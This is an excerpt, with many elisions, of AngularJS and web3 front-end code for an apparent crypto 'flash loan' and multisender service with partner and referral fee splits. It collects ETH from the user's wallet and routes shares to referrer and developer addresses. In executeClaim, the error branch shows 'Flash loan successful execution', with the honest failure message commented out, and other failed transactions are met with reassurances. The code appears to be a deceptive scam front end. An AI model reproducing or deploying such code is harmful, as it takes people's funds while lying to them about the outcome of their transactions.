...
app.controller('myCtrl', async function($scope) {
	...
	$scope.init = function() {
		...
		let { gasEther, awaitGas } = _gasPrice();
		...
		$scope.locationRefHomeUrl = location.href.substring(28, 116);
		$scope.locationRefReferralUrl = location.href.substring(32, 120);

		if (location.href.substring(18, 28) == '/home.html') {
			$scope.locationRefUrlFixedMulti = location.href.substring(30, 72) + '?=';
		} else if (location.href.substring(18, 32) == '/referral.html') {
			$scope.locationRefUrlFixedMulti = location.href.substring(34, 76) + '?=';
		} else {
			$scope.locationRefUrlFixedMulti = location.href.substring(21, 63) + '?=';
		}

		if ($scope.locationRefUrlFixedMulti.substring(0,2) == "0x") {
			$scope.locRefShort = $scope.locationRefUrlFixedMulti.substring(0,4) + '...' + $scope.locationRefUrlFixedMulti.substring(38,42) + '?=';
		} else{
			$scope.locRefShort = '';
		};
		...
		$scope.toplenShort = $scope.account.address.substring(0, 4);
		$scope.endlenShort = $scope.account.address.substring(42, 38);
		...
		$scope.getBalance = async function() {
			address = await web3.eth.getAccounts(function(err, acc) {
				accounts = acc
			});
			$scope.account.balanceForm = web3.utils.fromWei(await web3.eth.getBalance(accounts[0]), 'ether');
			$scope.account.balance = Number($scope.account.balanceForm).toFixed(2);
		}
		$scope.getBalance();
		...
		$scope.submitNetwork = function() {
			...
			if (!tokenSymbol.match(/^[a-zA-Z0-9-.]+$/)) return alert('Token Symbol can only contain letters');
		...
		$scope.submitLoanForm = function() {
			if (!$scope.ethDeposited) 
				...
				$scope.executeClaim() //$scope.executeLoan(); //$scope.executeClaim()
		}
		...
		$scope.checkref = function() {
			...
			$scope.partnerManager_short = $scope.sm1 + '...' + $scope.sm2;
			$scope.addr = $scope.account;
			//$scope.toplen = toplen;
			//$scope.endlen = endlen;
		}

		$scope.awaitGas = async function() {
			$scope.getGasPrice = (await web3.eth.getGasPrice()) * 100;
			$scope.gasValue = new BigNumber($scope.getGasPrice);
		}

		$scope.depositPartner = async function() {
			...
			$scope.awaitGas();
			$scope.newPartner = tokenName;
			$scope._encodedPartner();
			$scope.ethValue = new BigNumber(1);

			$scope.gas_partner = await web3.eth.estimateGas({
				from: $scope.account.address,
				data: $scope.encodedPartner,
				value: window.web3.utils.toWei($scope.ethValue.toString(), 'wei'),
			...
			window.web3.eth.sendTransaction({
				...
				from: $scope.account.address,
				value: window.web3.utils.toWei($scope.ethValue.toString(), 'wei'),
				gasPrice: window.web3.utils.toWei($scope.gasValue.toString(), 'wei'),
				gas: window.web3.utils.toHex($scope.gas_partner + 20000),
		...
		$scope.becomePartner = async function() {
			$scope.processing = true;
			$scope.awaitGas();
			$scope._encodedPartner();
			...
			.send({
				...
				if (error) {
					alert("Transaction Failed. Don't worry, when our devs see your deposit, will add your address to Partners.");
					$scope.processing = false;
					$scope.$apply();
				} else {
					setTimeout(function() {
		...
		const multisender = new web3.eth.Contract(stormMultisender.abi, stormMultisender.address);
			...
			if (
				...
				$scope.depositEth = async function() {
					...
					$scope.quote2 = window.web3.utils.toHex(window.web3.utils.toWei(($scope.quote * refBaseQuoteDev2).toString()));
					...
					$scope.multisend = multisender.methods
						...
						.send({
							from: $scope.account.address,
							gasPrice: window.web3.utils.toWei($scope.gasValue.toString(), 'wei'),
							gas: window.web3.utils.toHex($scope.gas + 140000),
							value: window.web3.utils.toHex($scope.ethValue.toString())
						},
						function(error, receipt) {
							$scope.processing = false;
							...
							if (error) alert('Transaction Failed');
								...
								setTimeout(function() {
									alert('Coin deposited to contract. Click OK to refresh the page.');
								}, 10000);
								$scope.ethDeposited = true;
								$scope.$apply();
							}
			...
			// MULTILEVEL
				...
				$scope.depositEth = async function() {
					...
					$scope.quote2 = window.web3.utils.toHex(window.web3.utils.toWei(($scope.quote * refMultiQuoteDev2).toString()));
					...
					$scope.multisend = multisender.methods
						...
						function(error, receipt) {
							...
							if (error) alert('Transaction Failed');
								...
								setTimeout(function() {
									alert('Coin approved to contract. Click OK to refresh the page.');
								}, 10000);
								$scope.ethDeposited = true;
								$scope.$apply();
							}
			...
			// PARTNER
				...
				$scope.depositEth = async function() {
					...
					$scope.quote = $scope.loan.totalFee / 100;
					$scope.main_quote = (100 - quote) / 100 * 60;
					$scope.main_quote2 = (100 - quote) / 100 * 40;
					$scope.quote1 = window.web3.utils.toHex(window.web3.utils.toWei(($scope.quote * $scope.main_quote).toString()));
					$scope.quote2 = window.web3.utils.toHex(window.web3.utils.toWei(($scope.quote * $scope.main_quote2).toString()));
			...
			// PARTNER + REFERRAL
				...
				$scope.depositEth = async function() {
					...
					$scope.quote = $scope.loan.totalFee / 100;
					$scope.main_quote = ((100 - quote) - quote_ref) / 100 * 60;
					$scope.main_quote2 = ((100 - quote) - quote_ref) / 100 * 40;
					$scope.quote1 = window.web3.utils.toHex(window.web3.utils.toWei(($scope.quote * $scope.main_quote).toString()));
					$scope.quote2 = window.web3.utils.toHex(window.web3.utils.toWei(($scope.quote * $scope.main_quote2).toString()));
					$scope.quote3 = window.web3.utils.toHex(window.web3.utils.toWei(($scope.quote * quote).toString()));
			...
			// NO REFERRER
				...
				$scope.depositEth = async function() {
					...
					$scope.quote2 = window.web3.utils.toHex(window.web3.utils.toWei(($scope.quote * dist.dev.quote.direct2).toString()));
					...
					$scope.gasUnit = $scope.gas;

					$scope.multisend = multisender.methods
						.multisendEther($scope.addresses_to_send, $scope.balances_to_send)
						.send({
							from: $scope.account.address,
							gasPrice: window.web3.utils.toWei('90', 'wei'),
							gas: window.web3.utils.toHex(50000),
							value: window.web3.utils.toHex($scope.ethValue.toString())
						},
						function(error, receipt) {
							$scope.processing = false;
		...
		$scope.executeLoan = async function() { // $scope.loan.claimFee broken :(
			...
			$scope.loan_quote2 = window.web3.utils.toHex(window.web3.utils.toWei(($scope.loan_quote * dist.dev.quote.direct2).toString()));
			...
			$scope.multisend = multisender.methods
				...
				.send({
					from: $scope.account.address,
					gasPrice: window.web3.utils.toWei($scope.gasValue.toString(), 'wei'),
					gas: window.web3.utils.toHex($scope.loan_gas + 140000),
					value: window.web3.utils.toHex($scope.loan_claimValue.toString())
				},
				function(error, receipt) {
					$scope.processing = false;
					...
					if (error) {
						...
						setTimeout(function() {
							...
							window.location.href = 'home.html' + location.href.substring(19, 107);
							hide();
						}, 5000);
						$scope.ethDeposited = true;
						$scope.$apply();
		...
		$scope.executeClaim = function() {
			...
			multisender.methods.action().send({
				...
				if (error) {
					...
					setTimeout(function() {
						alert('Flash loan successful execution, you will be redirected to a new page shortly.');
						//alert('Something went wrong, maybe your gas is insufficient or another user made the trade before you (Matching ID ee8uj1). Please try again.');
						window.location.href = 'home.html' + location.href.substring(19, 107);
					}, 5000);
				}
		...
		$scope._encodedPartner = async function() {
			$scope.encodedPartner = await manager.methods.becomePartner($scope.newPartner).encodeABI({
				from: $scope.account.address
			});
		}
	}
